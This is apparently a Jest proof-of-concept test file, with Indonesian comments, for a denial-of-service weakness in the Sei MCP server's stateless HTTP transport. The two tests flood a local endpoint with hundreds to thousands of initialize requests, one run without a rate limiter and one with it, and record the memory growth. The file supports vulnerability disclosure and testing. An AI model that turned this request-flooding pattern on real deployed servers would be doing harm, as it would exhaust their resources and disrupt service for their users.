import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import express from 'express';
import http from 'node:http';

// 1. Mock mintlify/search.ts untuk mencegah fetch keluar dan menghitung jumlah eksekusi
let mockSearchToolCallCount = 0;
jest.mock('../../mintlify/search.js', () => ({
    createSeiJSDocsSearchTool: jest.fn(async () => {
        mockSearchToolCallCount++;
        // Simulasi delay jaringan agar efek memory buildup terlihat
        await new Promise(resolve => setTimeout(resolve, 50));
    })
}));

// Mock docs agar tidak keluar jaringan
jest.mock('../../docs/index.js', () => ({
    createDocsSearchTool: jest.fn(async () => {})
}));

// Mock package-info.ts untuk mencegah crash __filename di Jest ESM
jest.mock('../../server/package-info.js', () => ({
    getPackageInfo: () => ({
        name: 'sei-mcp-server',
        version: '0.0.0',
        description: 'Sei MCP Server'
    })
}));

import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';
import { getServer } from '../../server/server.js';
import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';

// Custom Rate Limiter
const createRateLimiter = () => {
    let windowStart = 0;
    let requestCount = 0;
    const windowMs = 1000;
    const max = 100;

    return (req: any, res: any, next: any) => {
        const now = Date.now();
        if (!windowStart || (now - windowStart > windowMs)) {
            windowStart = now;
            requestCount = 0;
        }

        if (requestCount >= max) {
            return res.status(429).json({ error: 'Too Many Requests' });
        }

        requestCount++;
        next();
    };
};

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport: StreamableHttpTransport;
    const targetPort = 8913;

    beforeAll(() => {});

    afterAll(async () => {
        if (transport) await transport.stop();
    });

    // TEST 1: Tanpa Rate Limiter (Bare-metal server)
    it('should trigger getServer() and memory exhaustion on concurrent requests', async () => {
        // Reset counter sebelum test
        mockSearchToolCallCount = 0;

        transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
        await transport.start({} as any);

        const targetUrl = `http://localhost:${targetPort}/mcp`;
        const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };

        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Test 1 - No Limit] Memory before: ${memBefore.toFixed(2)} MB`);

        const attackCount = 500;
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {})
            );
        }

        await Promise.all(requests);
        await new Promise(resolve => setTimeout(resolve, 1000));

        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`[Test 1 - No Limit] Memory after: ${memAfter.toFixed(2)} MB`);
        console.log(`[Test 1 - No Limit] getServer() triggered: ${mockSearchToolCallCount} times`);
        console.log(`[Test 1 - No Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        expect(mockSearchToolCallCount).toBe(attackCount);
        expect(memAfter).toBeGreaterThan(memBefore);
    });

    // TEST 2: Dengan Rate Limiter (Simulasi API Gateway 100 req/s)
    it('should still cause memory exhaustion even with a rate limiter (100 req/s)', async () => {
        // Reset counter sebelum test
        mockSearchToolCallCount = 0;

        const app = express();
        app.use(express.json());
        app.use(createRateLimiter());
        
        app.post('/mcp', async (req: any, res: any) => {
            try {
                const mcpServer = await getServer();
                const httpTransport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
                res.on('close', () => {
                    httpTransport.close();
                    mcpServer.close();
                });
                await mcpServer.connect(httpTransport);
                await httpTransport.handleRequest(req, res, req.body);
            } catch (error) {
                if (!res.headersSent) res.status(500).json({ error: 'Internal Server Error' });
            }
        });

        const server = app.listen(8915);
        const targetUrl = `http://localhost:8915/mcp`;
        const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };

        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Test 2 - With Rate Limit] Memory before: ${memBefore.toFixed(2)} MB`);

        const attackCount = 1500; 
        for (let i = 0; i < attackCount; i++) {
            fetch(targetUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
            await new Promise(resolve => setTimeout(resolve, 10)); 
        }

        await new Promise(resolve => setTimeout(resolve, 100));

        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`[Test 2 - With Rate Limit] Memory after: ${memAfter.toFixed(2)} MB`);
        console.log(`[Test 2 - With Rate Limit] getServer() triggered: ${mockSearchToolCallCount} times`);
        console.log(`[Test 2 - With Rate Limit] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        server.close();

        expect(mockSearchToolCallCount).toBeGreaterThan(0);
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
